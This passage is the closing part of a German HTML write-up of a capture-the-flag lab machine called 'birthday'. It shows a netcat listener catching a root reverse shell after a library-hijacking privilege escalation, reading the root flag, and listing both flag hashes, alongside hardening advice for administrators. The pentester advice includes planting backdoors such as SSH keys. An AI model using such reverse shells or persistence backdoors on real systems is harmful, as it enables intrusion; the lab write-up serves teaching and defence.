+                **Bewertung:** **Fantastisch! Der Root-Zugriff war erfolgreich, nun habe ich mein Ziel erreicht!** Mein Netcat-Listener auf Port 4444 registriert eine eingehende Verbindung vom Zielsystem (192.168.2.41), und ich erhalte einen Shell-Prompt, der eindeutig auf den `root`-Benutzer hinweist (`root@birthday:/#`). Die Library Hijacking Schwachstelle kombiniert mit der unsicheren `sudo` Konfiguration wurde erfolgreich ausgenutzt, um vollständige Root-Privilegien auf dem System zu erlangen. Der Umweg über den `.deb` Exploit war interessant, aber der direkte Weg über die manipulierte Bibliothek hat zum Ziel geführt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sobald Root-Zugriff erlangt wurde, sofort die Root-Flag sichern und das System weiter auf sensible Daten oder Konfigurationen prüfen. Hintertüren für zukünftigen Zugriff etablieren (z.B. SSH-Schlüssel hinterlegen).
+                <br>**Empfehlung (Admin):** **KRITISCH:** Die Berechtigungen der Systembibliothek `/lib/x86_64-linux-gnu/libzodiac.so` müssen *sofort* korrigiert werden, sodass nur Root Schreibrechte hat. Die `sudoers`-Datei muss geprüft und die `NOPASSWD` Regel für `/usr/bin/zodiac` entfernt werden. Ein umfassender Sicherheitsaudit ist notwendig, um alle weiteren möglichen PE-Wege und Fehlkonfigurationen zu identifizieren und zu beheben. Monitoring auf Änderungen an kritischen Systemdateien und ungewöhnliche Prozessausführungen implementieren.
+            </p>
+            <p>
+                Ausnutzung der Library Hijacking Schwachstelle und Erlangung der Root-Shell:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.41] 36896</span>
+<span class="password">root@birthday:/#</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Mit der Root-Shell navigiere ich in das Home-Verzeichnis des Root-Benutzers (`cd /root`), liste die Dateien auf (`ls`) und finde die Root-Flag (`root.txt`). Anschließend lese ich den Inhalt der Datei mit `cat`.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Dies ist die finale Phase des Angriffs – die erfolgreiche Erlangung der Root-Flag, die das oberste Ziel bei einem Penetrationstest dieser Art darstellt. Das Vorhandensein der Root-Flag in `/root/` ist Standard und der erfolgreiche `cat`-Befehl bestätigt den vollständigen Kompromittierung des Systems.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die Root-Flag dokumentieren und den Test abschließen.
+                <br>**Empfehlung (Admin):** Sicherstellen, dass sensible Dateien (wie Flags in CTFs oder kritische Konfigurationsdateien) die restriktivsten Berechtigungen haben, sodass nur der benötigte Benutzer (typischerweise Root) sie lesen kann. Überprüfung des Inhalts von `/root/` und anderen kritischen Verzeichnissen auf unnötige oder sensible Dateien.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+root@birthday:/# <span class="command">cd /root</span>
+<span class="command">cd /root</span>
+root@birthday:~# <span class="command">ls</span>
+<span class="command">ls</span>
+<span class="command">root.txt</span>
+root@birthday:~# <span class="command">cat root.txt</span>
+<span class="command">cat root.txt</span>
+<span class="password">27ebd22f41640659d440a1b6ee0b0e09</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/chloe/user.txt</div>
+                    <div class="flag-value"><span class="password">c3323a392febd72b386922bd115850ce</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">27ebd22f41640659d440a1b6ee0b0e09</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    </div> <!-- Ende container -->
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 13 Jun 2025</p> <!-- Datum aus dem Berichtstext extrahiert -->
+    </footer>
+ 
+
+
+</body>
+</html>
